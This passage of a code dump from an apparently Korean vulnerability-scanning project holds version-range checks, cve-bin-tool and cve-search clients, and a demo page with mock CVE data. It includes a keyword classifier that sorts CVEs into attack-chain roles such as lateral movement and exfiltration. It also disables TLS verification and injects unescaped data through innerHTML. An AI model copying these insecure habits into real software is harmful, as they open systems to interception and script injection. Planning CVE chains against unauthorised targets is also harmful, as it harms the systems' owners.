            logger.debug(f"[VERIFIER] Version comparison error: {e}")
            return False
    
    
    def version_in_range(self, detected: str, version_range: str) -> bool:
        """
        CVE 버전 범위에 포함되는지 확인
        
        Args:
            detected: "2.2.4"
            version_range: "<3.0.0", ">=1.0 and <3.4.0"
        
        Returns:
            True if in range
        """
        try:
            # ">=1.0 and <3.4.0" 형식 파싱
            if " and " in version_range:
                parts = version_range.split(" and ")
                return all(self.version_in_range(detected, part.strip()) for part in parts)
            
            # "<3.0.0" 형식 파싱
            if "<=" in version_range:
                threshold = re.search(r"<=\s*(.+?)\s*$", version_range)
                if threshold:
                    return self.is_vulnerable_version(detected, "<=", threshold.group(1))
            
            if "<" in version_range:
                threshold = re.search(r"<\s*(.+?)\s*$", version_range)
                if threshold:
                    return self.is_vulnerable_version(detected, "<", threshold.group(1))
            
            return False
        
        except Exception as e:
            logger.debug(f"[VERIFIER] Version range check error: {e}")
            return False
```
---

## File 54: workflow.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\workflow.py`

```python

```
---

## File 55: cve_bin_client.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\cve_bin_client.py`

```python
# app/cve_bin_client.py

import json
import subprocess
from typing import List, Dict


def build_product_list_from_recon(recon_result: List[Dict]) -> List[Dict]:
    """
    Nmap recon 결과에서 cve-bin-tool에 넘길 대상 호스트/서비스 리스트 추출.

    지금 버전에서는 실제 cve-bin-tool 호출에 직접 쓰지는 않고,
    나중에 Searchsploit/LLM에 메타데이터로 넘길 때만 사용한다.
    """
    results = []

    for host in recon_result:
        ip = host.get("ip")
        for port in host.get("ports", []):
            product = (port.get("product") or "").lower()
            version = (port.get("version") or "").strip()
            if not product or not version:
                continue

            vendor, prod = normalize_product_for_label(product)
            results.append(
                {
                    "vendor": vendor,
                    "product": prod,
                    "version": version,
                    "port": port.get("port"),
                    "service": port.get("service"),
                    "host_ip": ip,
                }
            )

    return results


def normalize_product_for_label(product_name: str):
    """
    Nmap product 문자열을 우리 쪽 라벨용 vendor/product로만 단순 매핑.
    (cve-bin-tool 입력에는 직접 사용하지 않는다)
    """
    p = (product_name or "").lower()

    if "apache" in p and ("httpd" in p or "apache http" in p):
        return "apache", "httpd"
    if "nginx" in p:
        return "nginx", "nginx"
    if "mysql" in p:
        return "mysql", "mysql"
    if "postgres" in p:
        return "postgresql", "postgresql"
    if "openssh" in p:
        return "openssh", "openssh"

    return None, None


def run_cve_bin_tool_on_root() -> List[Dict]:
    """
    현재 호스트(WSL 컨테이너 등)의 루트 디렉터리를 스캔해서
    cve-bin-tool JSON2 리포트를 받아온다.

    *주의*: 데모/연구용으로만 사용. 실제 운영 서버 전체를 막 스캔하는 용도는 아님.
    """
    cmd = [
        "cve-bin-tool",
        "-q",                      # quiet: 콘솔 출력 줄이기
        "--format", "json2",       # 기계가 파싱하기 좋은 JSON2 포맷
        "--output-file", "-",      # stdout으로 출력
        "/",                       # 루트 디렉터리 기준 스캔 (테스트 환경)
    ]
    print("[DEBUG] cve-bin-tool cmd:", cmd)

    try:
        result = subprocess.run(cmd, check=False, capture_output=True, text=True)
    except Exception as e:
        print("[ERROR] cve-bin-tool 실행 자체 실패:", e)
        return []

    print("[DEBUG] cve-bin-tool returncode:", result.returncode)
    if result.stderr:
        print("[DEBUG] cve-bin-tool stderr:", result.stderr[:500])

    if result.returncode != 0:
        # 스캔 실패 시 빈 결과
        return []

    text = result.stdout.strip()
    if not text:
        print("[DEBUG] cve-bin-tool stdout 비어 있음")
        return []

    try:
        data = json.loads(text)
    except json.JSONDecodeError as e:
        print("[ERROR] cve-bin-tool JSON 파싱 실패:", e)
        return []

    # JSON2 포맷 가정:
    # {
    #   "version": "...",
    #   "cve": [
    #     {
    #       "product": "apache_http_server",
    #       "version": "2.4.49",
    #       "vendor": "apache",
    #       "cves": [
    #         { "cve_number": "CVE-2021-41773", "cvss_score": 7.5, "severity": "HIGH", "description": "..." },
    #         ...
    #       ]
    #     },
    #     ...
    #   ]
    # }
    if not isinstance(data, dict):
        return []

    entries = data.get("cve") or []
    if not isinstance(entries, list):
        return []

    normalized_input = []
    for entry in entries:
        vendor = entry.get("vendor")
        product = entry.get("product")
        version = entry.get("version")
        cves = entry.get("cves") or []
        normalized_input.append(
            {
                "vendor": vendor,
                "product": product,
                "version": version,
                "cves": cves,
            }
        )

    print("[DEBUG] cve-bin-tool raw 항목 수:", len(normalized_input))
    return normalized_input


def normalize_cve_bin_results(cve_bin_results: List[Dict], max_per_service: int = 10) -> List[Dict]:
    """
    cve-bin-tool 결과를 대시보드/LLM용 공통 포맷으로 정규화.

    출력 예:
    [
      {
        "cve_id": "CVE-2021-41773",
        "cvss": 7.5,
        "severity": "High",
        "summary": "",
        "source": "cve-bin-tool",
        "vendor": "apache",
        "product": "apache_http_server",
        "version": "2.4.49",
      },
      ...
    ]
    """
    normalized = []

    for item in cve_bin_results:
        vendor = item.get("vendor")
        product = item.get("product")
        version = item.get("version")
        cves = item.get("cves") or []

        for cve in cves[:max_per_service]:
            cve_id = cve.get("cve_number") or cve.get("cve_id") or ""
            if not cve_id:
                continue

            cvss = cve.get("cvss_score") or cve.get("cvss") or 0.0
            try:
                cvss_val = float(cvss)
            except (TypeError, ValueError):
                cvss_val = 0.0

            severity = cve.get("severity") or cvss_to_severity(cvss_val)
            summary = cve.get("description") or cve.get("summary") or ""

            normalized.append(
                {
                    "cve_id": cve_id,
                    "cvss": cvss_val,
                    "severity": severity.title() if isinstance(severity, str) else severity,
                    "summary": summary,
                    "source": "cve-bin-tool",
                    "vendor": vendor,
                    "product": product,
                    "version": version,
                }
            )

    print("[DEBUG] normalize_cve_bin_results 결과 CVE 수:", len(normalized))
    return normalized


def cvss_to_severity(score):
    try:
        s = float(score)
    except (TypeError, ValueError):
        return "Unknown"
    if s >= 9.0:
        return "Critical"
    if s >= 7.0:
        return "High"
    if s >= 4.0:
        return "Medium"
    if s > 0:
        return "Low"
    return "None"
```
---

## File 56: cve_client.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\cve_client.py`

```python
# app/cve_client.py

import requests
from json import JSONDecodeError
from urllib.parse import quote
from flask import current_app


def search_cves_by_service(vendor: str, product: str):
    """
    vendor/product로 cve-search에서 CVE 리스트 조회.
    """
    base_url = current_app.config["CVE_SEARCH_BASE_URL"]
    url = f"{base_url}/search/{quote(vendor)}/{quote(product)}"
    try:
        resp = requests.get(url, timeout=15, verify=False)
        resp.raise_for_status()
        try:
            data = resp.json()
        except JSONDecodeError as e:
            # 어떤 내용이 왔는지 확인용 로그
            print(
                f"[ERROR] CVE-Search JSON 파싱 실패: url={url}, "
                f"status={resp.status_code}, text_snippet={resp.text[:200]!r}"
            )
            raise
    except Exception:
        # 호출한 쪽(routes.py)에서 WARN 로그를 찍으므로 여기서는 그대로 예외 전파
        raise

    # 응답이 dict일 경우(에러 메시지 등) 방어 로직
    if isinstance(data, dict):
        # 보통 {"results": [...]} 형태라면 그걸 꺼내서 돌려주도록 처리
        results = data.get("results")
        if isinstance(results, list):
            return results
        return []

    # 정상적으로 리스트면 그대로 반환
    if isinstance(data, list):
        return data

    return []


def get_cve_detail(cve_id: str):
    base_url = current_app.config["CVE_SEARCH_BASE_URL"]
    url = f"{base_url}/cve/{cve_id}"
    resp = requests.get(url, timeout=15, verify=False)
    resp.raise_for_status()
    return resp.json()


def classify_cve_role(item: dict) -> str:
    """
    여러 CVE를 엮기 위해 '역할'을 추론.
    - initial_access: RCE, auth bypass, remote web vuln
    - privilege_escalation: local privesc
    - lateral_movement: SMB/RDP/SSH 등 서비스 기반 lateral
    - data_exfiltration: DB dump, 정보 노출
    아주 러프한 규칙이라, LLM이 이후에 보완해 줄 전처리용이라고 보면 됨.
    """
    summary = (item.get("summary") or "").lower()
    cwe_list = [c.lower() for c in item.get("cwe", [])]
    text = summary + " " + " ".join(cwe_list)

    # 초기 진입 / RCE / 인증우회
    if any(k in text for k in [
        "remote code execution", "rce", "exec code", "command execution",
        "auth bypass", "authentication bypass", "unauthenticated", "directory traversal"
    ]):
        return "initial_access"

    # 권한 상승
    if any(k in text for k in [
        "privilege escalation", "elevation of privilege", "eop"
    ]):
        return "privilege_escalation"

    # 측면 이동
    if any(k in text for k in [
        "smb", "rdp", "ssh", "remote login", "lateral", "remote desktop"
    ]):
        return "lateral_movement"

    # 데이터 탈취 / 정보노출
    if any(k in text for k in [
        "information disclosure", "data leak", "exfiltration", "leak",
        "sql injection", "sqli", "expose", "download arbitrary"
    ]):
        return "data_exfiltration"

    return "other"


def normalize_cve_list(raw_cve_list):
    """
    cve-search 응답 JSON을 대시보드용 구조로 변환.
    (여러 CVE 체인용으로 role 필드까지 포함)
    """
    normalized = []
    if not isinstance(raw_cve_list, list):
        return normalized

    for item in raw_cve_list:
        if not isinstance(item, dict):
            continue

        cve_id = item.get("id") or item.get("cve_id") or ""
        summary = item.get("summary") or ""

        cvss = item.get("cvss")
        if cvss is None:
            cvss = item.get("cvss3")

        try:
            cvss_val = float(cvss) if cvss is not None else 0.0
        except (TypeError, ValueError):
            cvss_val = 0.0

        severity = cvss_to_severity(cvss_val)

        vulnerable_versions = (
            item.get("vulnerable_configuration")
            or item.get("vulnerable_configuration_cpe_2_2")
            or []
        )

        role = classify_cve_role(item)

        normalized.append({
            "cve_id": cve_id,
            "cvss": cvss_val,
            "severity": severity,
            "summary": summary,
            "vulnerable_versions": vulnerable_versions,
            "role": role,  # 체인 구성용
        })

    return normalized


def cvss_to_severity(score):
    try:
        s = float(score)
    except (TypeError, ValueError):
        return "Unknown"

    if s >= 9.0:
        return "Critical"
    if s >= 7.0:
        return "High"
    if s >= 4.0:
        return "Medium"
    if s > 0:
        return "Low"
    return "None"
```
---

## File 57: cve_detail_preview.html
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\cve_detail_preview.html`

```html
<!doctype html>
<html lang="ko">
<head>
  <meta charset="utf-8">
  <title>CVE 상세 정보 미리보기</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
  <style>
    body {
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      background-color: #1a1a1a;
      color: #fff;
      padding: 2rem;
    }
    .badge-severity-critical {
      background-color: #dc3545;
    }
    .badge-severity-high {
      background-color: #fd7e14;
    }
    .badge-severity-medium {
      background-color: #ffc107;
      color: #000;
    }
    .badge-severity-low {
      background-color: #0d6efd;
    }
    .preview-container {
      max-width: 900px;
      margin: 0 auto;
    }
    .demo-button {
      margin-bottom: 2rem;
    }
  </style>
</head>
<body>
  <div class="preview-container">
    <h1 class="mb-4">CVE 상세 정보 카드 미리보기</h1>
    <p class="text-muted mb-4">아래 버튼을 클릭하면 모달이 열립니다.</p>
    
    <button class="btn btn-primary demo-button" onclick="showDemo('critical')">
      Critical CVE 예시 (아파치)
    </button>
    <button class="btn btn-warning demo-button" onclick="showDemo('high')">
      High CVE 예시 (nginx)
    </button>
    <button class="btn btn-info demo-button" onclick="showDemo('medium')">
      Medium CVE 예시 (MySQL)
    </button>
    
    <hr class="my-4">
    
    <!-- 모달 -->
    <div class="modal fade show" id="cveDetailModal" tabindex="-1" style="display: block;" aria-modal="true" role="dialog">
      <div class="modal-dialog modal-lg modal-dialog-scrollable">
        <div class="modal-content bg-dark text-light">
          <div class="modal-header border-secondary">
            <h5 class="modal-title">CVE 상세 정보</h5>
            <button type="button" class="btn-close btn-close-white" onclick="closeModal()" aria-label="Close"></button>
          </div>
          <div class="modal-body" id="cveDetailContent">
            <!-- 여기에 동적으로 내용이 들어갑니다 -->
          </div>
        </div>
      </div>
    </div>
    <div class="modal-backdrop fade show" id="modalBackdrop" onclick="closeModal()"></div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
  <script>
    // 모의 데이터
    const mockCves = {
      critical: {
        cve_id: "CVE-2024-12345",
        severity: "Critical",
        cvss: 9.8,
        product: "Apache HTTP Server",
        version: "2.4.55",
        service: "httpd",
        host_ip: "192.168.1.100",
        port: 80,
        source: "network_scan",
        description: "Apache HTTP Server 2.4.55 and earlier versions are vulnerable to a remote code execution vulnerability. An attacker can exploit this vulnerability by sending a specially crafted request to the server, which allows arbitrary code execution with the privileges of the web server process.",
        is_vulnerable: true,
        vulnerable_ranges: ["2.4.0 ~ 2.4.55"]
      },
      high: {
        cve_id: "CVE-2024-23456",
        severity: "High",
        cvss: 7.5,
        product: "nginx",
        version: "1.24.0",
        service: "nginx",
        host_ip: "192.168.1.101",
        port: 443,
        source: "web_scan",
        description: "nginx 1.24.0 and earlier versions contain a buffer overflow vulnerability in the HTTP/2 module. An attacker can cause a denial of service or potentially execute arbitrary code by sending a malicious HTTP/2 request.",
        is_vulnerable: true,
        vulnerable_ranges: ["1.20.0 ~ 1.24.0"]
      },
      medium: {
        cve_id: "CVE-2024-34567",
        severity: "Medium",
        cvss: 5.3,
        product: "MySQL",
        version: "8.0.33",
        service: "mysql",
        host_ip: "192.168.1.102",
        port: 3306,
        source: "database_scan",
        description: "MySQL Server 8.0.33 and earlier versions are vulnerable to an information disclosure vulnerability. An authenticated attacker can exploit this to read sensitive information from the database server.",
        is_vulnerable: false,
        vulnerable_ranges: ["8.0.0 ~ 8.0.32"]
      }
    };

    function showDemo(type) {
      const cve = mockCves[type];
      renderCveDetail(cve);
      document.getElementById('cveDetailModal').style.display = 'block';
      document.getElementById('modalBackdrop').style.display = 'block';
    }

    function closeModal() {
      document.getElementById('cveDetailModal').style.display = 'none';
      document.getElementById('modalBackdrop').style.display = 'none';
    }

    function renderCveDetail(cve) {
      const contentDiv = document.getElementById("cveDetailContent");
      
      // CVSS 등급에 따른 색상과 아이콘
      const severity = (cve.severity || "Unknown").toLowerCase();
      let severityColor = "secondary";
      let severityIcon = "⚠️";
      
      if (severity === "critical") {
        severityColor = "danger";
        severityIcon = "🔴";
      } else if (severity === "high") {
        severityColor = "warning";
        severityIcon = "🟠";
      } else if (severity === "medium") {
        severityColor = "info";
        severityIcon = "🟡";
      } else if (severity === "low") {
        severityColor = "primary";
        severityIcon = "🔵";
      }
      
      // 매칭된 제품 정보
      const matchedProduct = cve.product || cve.service || cve.technology || "알 수 없음";
      const scannedVersion = cve.version || "버전 정보 없음";
      const isVulnerable = cve.is_vulnerable !== false;
      
      // 버전 매칭 상태
      const statusIcon = isVulnerable ? "❌" : "✅";
      const statusText = isVulnerable ? "취약 버전 범위에 포함됨" : "안전한 버전";
      const statusClass = isVulnerable ? "danger" : "success";
      
      // 스캔 정보
      let scanInfoHtml = "";
      if (cve.host_ip || cve.port || cve.service) {
        scanInfoHtml = `
          <div class="card bg-secondary mb-3">
            <div class="card-body">
              <h6 class="card-title">스캔 정보</h6>
              <div class="small">
                ${cve.host_ip ? `<div class="mb-1">호스트: <code>${cve.host_ip}</code></div>` : ""}
                ${cve.port ? `<div class="mb-1">포트: <code>${cve.port}</code></div>` : ""}
                ${cve.service ? `<div class="mb-1">서비스: <code>${cve.service}</code></div>` : ""}
              </div>
            </div>
          </div>
        `;
      }
      
      // 출처 정보
      const sourceLabels = {
        "network_scan": "네트워크 스캔",
        "web_scan": "웹 스캔",
        "os_scan": "OS 스캔",
        "database_scan": "데이터베이스 스캔",
        "cloud_scan": "클라우드 스캔",
        "container_scan": "컨테이너 스캔"
      };
      const sourceLabel = sourceLabels[cve.source] || cve.source || "알 수 없음";
      
      contentDiv.innerHTML = `
        <div class="mb-3">
          <div class="d-flex align-items-center justify-content-between mb-3">
            <h4 class="mb-0">${cve.cve_id || "Unknown"}</h4>
            <span class="badge bg-${severityColor} fs-6">${severityIcon} ${cve.severity || "Unknown"}</span>
          </div>
          <div class="mb-3">
            <div class="d-flex align-items-center gap-3">
              <div>
                <small class="text-muted">CVSS 점수</small>
                <div class="fs-4 fw-bold">${cve.cvss?.toFixed(1) || "N/A"}</div>
              </div>
            </div>
          </div>
        </div>
        
        <div class="card bg-secondary mb-3">
          <div class="card-body">
            <h6 class="card-title">매칭 정보</h6>
            <div class="mb-2">
              <small class="text-muted">발견된 제품:</small>
              <div class="fw-bold fs-5">${matchedProduct}</div>
            </div>
        <div class="mb-3">
          <small class="text-muted">스캔한 버전:</small>
          <div class="fw-bold fs-6">${scannedVersion}</div>
        </div>
        ${cve.vulnerable_ranges && cve.vulnerable_ranges.length > 0 ? `
          <div class="mb-3">
            <small class="text-muted">취약한 버전 범위:</small>
            <div class="fw-bold">${cve.vulnerable_ranges.join(", ")}</div>
          </div>
        ` : ""}
        <div class="mb-2">
          <small class="text-muted">출처:</small>
          <div>${sourceLabel}</div>
        </div>
            <div class="mt-3">
              <span class="badge bg-${statusClass} fs-6">${statusIcon} ${statusText}</span>
            </div>
          </div>
        </div>
        
        ${scanInfoHtml}
        
        <div class="mb-3">
          <h6>취약점 설명</h6>
          <div class="card bg-secondary">
            <div class="card-body">
              <p class="mb-0">${cve.description || cve.summary || "설명 없음"}</p>
            </div>
          </div>
        </div>
        
        <div class="mb-3">
          <a href="https://nvd.nist.gov/vuln/detail/${cve.cve_id}" target="_blank" class="btn btn-outline-info">
            NVD 상세 페이지 보기
          </a>
        </div>
      `;
    }

    // 페이지 로드 시 첫 번째 예시 자동 표시
    window.addEventListener("DOMContentLoaded", () => {
      showDemo('critical');
    });
  </script>
</body>
</html>

```
---
>>>>>>> 6765f0338e4cc09c98a75bde603f7d50bbd85642
